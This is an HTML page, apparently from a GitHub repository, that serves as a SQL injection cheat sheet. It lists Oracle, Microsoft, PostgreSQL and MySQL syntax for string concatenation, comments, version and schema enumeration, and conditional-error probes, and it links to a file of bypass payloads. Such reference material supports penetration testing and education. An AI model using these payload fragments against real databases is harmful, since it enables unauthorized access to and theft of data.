<h1>SQL Injection Cheat Sheets</h1>
<p>This contains examples of useful syntax to perform SQL injection Attacks.</p>

<a href="https://github.com/kaung-khant-zaw223/cheat-sheets/blob/main/SQL_Injection_ByPass_Payloads.md">SQL Injection Bypass Payloads</a>

<h2>String Concatenation</h2>
<p><b>Oracle      :</b> 'foo'||'bar'</p>
<p><b>Microsoft   :</b> 'foo'+'bar'</p>
<p><b>PostgreSQL:</b> 'foo'||'bar' </p>
<p><b>MySQL:</b> 'foo' 'bar'</p>

<h2>Substring</h2>
<p><b>Oracle:</b> SUBSTR('foobar', 4, 2)</p>
<p><b>Microsoft:</b> SUBSTRING('foobar', 4, 2)</p>
<p><b>PostgreSQL:</b> SUBSTRING('foobar', 4, 2)</p>
<p><b>MySQL:</b> SUBSTRING('foobar', 4, 2)</p>

<h2>Comments</h2>
<p><b>Oracle:</b> --comment</p>
<p><b>Microsoft:</b> --comment (or) /*comment*/ </p>
<p><b>PostgreSQL:</b> --comment (or) /*comment*/ </p>
<p><b>MySQL:</b> #comment (or) --comment (or) /*comment*/</p>

<h2>Database Version</h2>
<p><b>Oracle:</b> SELECT banner FROM v$version (or) SELECT version FROM v$instance</p>
<p><b>Microsoft:</b> SELECT @@version</p>
<p><b>PostgreSQL: </b> SELECT version()</p>
<p><b>MySQL:</b> SELECT @@version </p>

<h2>Database Contents</h2>
<p><b>Oracle:</b> SELECT * FROM all_tables (or) SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' </p>
<p><b>Microsoft:</b> SELECT * FROM information_schema.tables (or) SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' </p>
<p><b>PostgreSQL:</b> SELECT * FROM information_schema.tables (or) SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' </p>
<p><b>MySQL:</b> SELECT * FROM information_schema.tables (or) SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' </p>

<h2>Conditional Errors</h2>
<p><b>Oracle:</b> SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</p>
<p><b>Microsoft:</b>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</p>
<p><b>PostgreSQL:</b>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</p>
<p><b>MySQL:</b>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</p>

